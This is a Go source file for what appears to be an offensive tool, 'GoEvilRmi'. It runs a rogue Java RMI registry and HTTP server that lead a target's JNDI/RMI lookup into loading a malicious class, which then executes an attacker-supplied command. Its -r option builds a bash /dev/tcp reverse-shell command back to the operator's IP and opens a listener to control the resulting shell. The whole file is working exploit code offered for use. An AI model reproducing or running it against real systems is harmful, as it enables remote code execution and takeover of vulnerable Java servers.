package main

import (
	"GoEvilRmi/tools"
	"bytes"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
)

var flag1 = true
var flag2 = true
var IP string
var cmd string
var classfile string
var httpport = 7777
var classname = "T3st"
var rmiport = 7777
var revport = 0
var wg sync.WaitGroup

func handleConnection1(conn net.Conn) {
	defer conn.Close()
	buf := make([]byte, 1024)
	n, _ := conn.Read(buf)
	data := buf[:n]
	if bytes.Equal(data, []byte{0x4a, 0x52, 0x4d, 0x49, 0x0, 0x2, 0x4b}) {
		tools.Out("RMI服务", "接收到请求，来自于IP："+conn.RemoteAddr().String(), flag1)
		var bs bytes.Buffer
		bs.Write([]byte{78})
		bs.Write(tools.WriteUTFparse([]byte("127.0.0.1")))
		bs.WriteByte(0)
		bs.WriteByte(0)
		bs.Write(tools.Writeshortparse(6666))
		conn.Write(bs.Bytes())
		tools.Out("RMI服务", "向客户端发送了IP地址和端口", flag1)
		ip := string(tools.ReadUTF(conn))
		port, _ := strconv.Atoi(string(tools.ReadUTF(conn)))
		tools.Out("RMI服务", "接收到客户端的内网IP地址", flag1)
		tools.Out("RMI服务", ip+": "+strconv.Itoa(port), flag1)
		name := tools.ReadName(conn)
		tools.Out("RMI服务", "接收到rmi名称 ["+name+"]", flag1)
		conn.Write(tools.Getrmires(IP, rmiport))
		tools.Out("RMI服务", "已经向客户端发送Remote序列化对象，后续将交由["+strconv.Itoa(rmiport)+"]端口的Reomte服务进行交互", flag1)
		flag1 = false
	}
}

func handleConnection2(conn net.Conn) {
	defer conn.Close()
	buf := make([]byte, 10240)
	n, _ := conn.Read(buf)
	data := buf[:n]
	if bytes.Equal(data, []byte{0x4a, 0x52, 0x4d, 0x49, 0x0, 0x2, 0x4b}) {
		tools.Out("Remote服务", "接收到请求，来自IP："+conn.RemoteAddr().String(), flag2)
		var bs bytes.Buffer
		bs.Write([]byte{78})
		bs.Write(tools.WriteUTFparse([]byte("127.0.0.1")))
		bs.WriteByte(0)
		bs.WriteByte(0)
		bs.Write(tools.Writeshortparse(7777))
		conn.Write(bs.Bytes())
		tools.Out("Remote服务", "向客户端发送了IP地址和端口", flag2)
		ip := string(tools.ReadUTF(conn))
		port := string(tools.ReadUTF(conn))
		tools.Out("Remote服务", "接收到客户端上传的内网IP地址", flag2)
		tools.Out("Remote服务", ip+":"+port, flag2)
		data1, _ := tools.ReadAll(conn)
		if len(data1) > 30 {
			if flag2 {
				tools.Out("Remote服务", "收到客户端获取序列化数据的请求", flag2)
				dehexdata, _ := hex.DecodeString("51aced0005770f013d352bcc0000018773debb128003737200126a6176612e726d692e6467632e4c65617365b0b5e2660c4adc340200024a000576616c75654c0004766d69647400134c6a6176612f726d692f6467632f564d49443b70787000000000000927c0737200116a6176612e726d692e6467632e564d4944f8865bafa4a56db60200025b0004616464727400025b424c00037569647400154c6a6176612f726d692f7365727665722f5549443b707870757200025b42acf317f8060854e00200007078700000000826f955a9313d38a0737200136a6176612e726d692e7365727665722e5549440f12700dbf364f12020003530005636f756e744a000474696d65490006756e6971756570787080010000018773ded3eb671a98ea")

				conn.Write(dehexdata)
				tools.Out("Remote服务", "已经向客户端发送第一次序列化数据", flag2)
				data2, _ := tools.ReadAll(conn)
				if len(data2) > 10 {
					tools.Out("Remote服务", "收到客户端确认包", flag2)
				}
				conn.Write(tools.Getclasslocation(IP, strconv.Itoa(httpport), classname))
				tools.Out("Remote服务", "已经向客户端发送第二次序列化数据，客户端即将加载远程类，交由["+strconv.Itoa(httpport)+"]端口的http服务进行交互", flag2)
				flag2 = false
			} else {
				// 当连接比较缓慢时客户端可能会重试序列化请求，直接发送第二次序列化包即可
				conn.Write(tools.Getclasslocation(IP, strconv.Itoa(httpport), classname))
			}
		}
	} else if bytes.Equal(data[0:3], []byte("GET")) {
		tools.Out("HTTP服务", "收到请求，来自IP："+conn.RemoteAddr().String(), true)
		Ua := bytes.Split(bytes.Split(data, []byte("User-Agent: "))[1], []byte("\r\n"))[0]
		tools.Out("HTTP服务", "目标Java版本为："+string(Ua), true)
		if classfile != "" {
			conn.Write(tools.GethttpEvilClassfromfile(classfile))
		} else {
			conn.Write(tools.GethttpEvilClass(cmd))
		}
		tools.Out("HTTP服务", "已经向目标发送恶意class，攻击流程完成。", true)
		wg.Wait()
		os.Exit(6666)
	} else {
		tools.Out("m4x", "收到不明连接", true)
	}
}

func Step1() {
	listener, err := net.Listen("tcp", ":6666")
	if err != nil {
		panic(err)
	}
	defer listener.Close()
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println(err)
		}
		go handleConnection1(conn)
	}

}

func Step2() {
	listener, err := net.Listen("tcp", ":7777")
	if err != nil {
		panic(err)
	}
	defer listener.Close()
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println(err)
			continue
		}

		go handleConnection2(conn)
	}
}

func Rev() {
	wg.Add(1)
	listener, err := net.Listen("tcp", ":"+strconv.Itoa(revport))
	tools.Out("反弹shell", fmt.Sprintf("已经在%s端口启动反弹shell监听", strconv.Itoa(revport)), true)
	if err != nil {
		panic(err)
	}
	defer listener.Close()
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println(err)
			continue
		}
		go func(conn net.Conn) {
			rip := conn.RemoteAddr().String()
			tools.Out("反弹shell", fmt.Sprintf("收到连接: [%s] 即将进入到交互shell模式", rip), true)
			go io.Copy(os.Stdout, conn)
			io.Copy(conn, os.Stdin)
		}(conn)
	}
}

func main() {
	flag.StringVar(&IP, "i", "", "-i [公网IP]  一定要是目标机器能访问到的")
	flag.StringVar(&cmd, "c", "", "-c [执行的命令] 注意，是Runtime.getRuntime().exec执行的，因此会导致某些格式的命令执行不了，特殊命令请自定义class来执行")
	flag.IntVar(&revport, "r", 0, "-r [反弹shell的端口] 只支持目标为Linux时使用")
	flag.StringVar(&classfile, "f", "", "-f [class文件名] 可以指定发送恶意类，将需要执行的代码放在static代码块里面即可，文件名请用 类名.xxx 的形式(xxx为任意字符串)，如:Evil.class")
	flag.Parse()
	if IP == "" && (cmd == "" && classfile == "" && flag.Lookup("r") == nil) {
		fmt.Println("IP 和 命令或class文件名或-r参数 需要传入， -h 可以查看帮助")
		os.Exit(1111)
	}
	if cmd != "" && classfile != "" && flag.Lookup("r") != nil {
		fmt.Println("不能同时指定命令和class文件和反弹shell")
		os.Exit(1111)
	}
	if revport != 0 {
		go Rev()
		cmd = fmt.Sprintf("bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'", IP, strconv.Itoa(revport))
	}
	if classfile != "" {
		_, err := os.Stat(classfile)
		if err != nil {
			fmt.Println("指定的class文件不存在")
			os.Exit(1111)
		}
		_, fileName := filepath.Split(classfile)
		classname = strings.Split(fileName, ".")[0]
		tools.CheckClassname(classfile, classname)
		tools.Out("控制台", "指定恶意类类名为["+classname+"]", true)
	}
	tools.Out("控制台", "请使用 rmi://"+IP+":6666/test 来进行使用", true)
	go Step1()
	Step2()
	wg.Wait()
}
